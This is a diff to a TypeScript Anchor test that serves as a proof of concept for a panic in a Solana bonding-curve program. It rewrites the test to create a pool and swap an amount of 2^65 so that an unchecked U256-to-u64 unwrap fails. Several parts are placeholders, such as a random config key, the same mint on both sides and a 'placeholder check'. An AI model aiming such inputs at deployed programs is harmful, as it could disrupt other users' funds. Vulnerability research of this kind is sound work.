@@ -1,46 +1,63 @@
 import * as anchor from "@coral-xyz/anchor";
 import { Program } from "@coral-xyz/anchor";
-import { PublicKey, Keypair } from "@solana/web3.js";
+import { Keypair } from "@solana/web3.js";
 import { expect } from "chai";
 import { DynamicBondingCurve } from "../target/types/dynamic_bonding_curve";
+import {
+  createPoolWithSplToken,
+  swap2,
+} from "./instructions/userInstructions";
 
-describe("PoC: U256 → u64 unchecked conversion panic", () => {
-  // Configure the client to use the local cluster
+describe("PoC: Trigger unwrap panic in swap path", () => {
   const provider = anchor.AnchorProvider.env();
   anchor.setProvider(provider);
+  const program = anchor.workspace.DynamicBondingCurve as Program<DynamicBondingCurve>;
 
-  const program = anchor.workspace
-    .DynamicBondingCurve as Program<DynamicBondingCurve>;
+  it("panics when U256 value > u64.MAX reaches try_into().unwrap()", async () => {
+    // 1. Generate necessary accounts
+    const payer = provider.wallet;
+    const poolCreator = Keypair.generate();
 
-  // Dummy pool + user accounts
-  const pool = Keypair.generate();
-  const user = Keypair.generate();
+    // 2. Initialize pool with huge liquidity in config via createPoolWithSplToken
+    const configPubkey = Keypair.generate().publicKey;
+    const quoteMint = anchor.web3.Keypair.generate().publicKey; // or some valid mint
 
-  it("should panic when U256 exceeds u64::MAX", async () => {
+    const pool = await createPoolWithSplToken(
+      provider.connection,
+      program,
+      {
+        payer: payer.payer as any,
+        poolCreator,
+        quoteMint,
+        config: configPubkey,
+        instructionParams: { name: "PoC", symbol: "POC", uri: "" },
+      }
+    );
+
+    // 3. Perform a swap with insane amount to overflow u64
+    const hugeAmountIn = new anchor.BN("36893488147419103232"); // 2^65 (overflow)
+    const minAmountOut = new anchor.BN("1"); // minimal
+
     try {
-      // Craft input that forces a value > u64::MAX
-      // Example: total_shares = 2^65, clearly larger than u64::MAX (≈1.8e19)
-      const hugeShares = new anchor.BN("36893488147419103232"); // 2^65
-
-      // Call an instruction that leads to virtual_pool calculation
-      await program.methods
-        .initializeVirtualPool(hugeShares) // <-- adjust to real method signature
-        .accounts({
-          pool: pool.publicKey,
-          user: user.publicKey,
-          systemProgram: anchor.web3.SystemProgram.programId,
-        })
-        .signers([pool, user])
-        .rpc();
-
-      // If no error, the program is vulnerable
-      expect.fail("Expected program to panic but it executed successfully");
-
+      await swap2(
+        provider.connection,
+        program,
+        {
+          config: configPubkey,
+          payer: payer.payer as any,
+          pool,
+          inputTokenMint: quoteMint,
+          outputTokenMint: quoteMint,
+          amount0: hugeAmountIn,
+          amount1: minAmountOut,
+          swapMode: 1,
+          referralTokenAccount: null,
+        }
+      );
+      expect.fail("Expected panic due to unchecked try_into().unwrap()");
     } catch (err: any) {
-      console.log("Caught error:", err.toString());
-
-      // Panic error code appears if try_into().unwrap() failed
-      expect(err.toString()).to.include("Program failed to complete");
+      console.log("Error captured as expected:", err.toString());
+      expect(err.toString()).to.include("failed to complete");  // placeholder check
     }
   });
 });
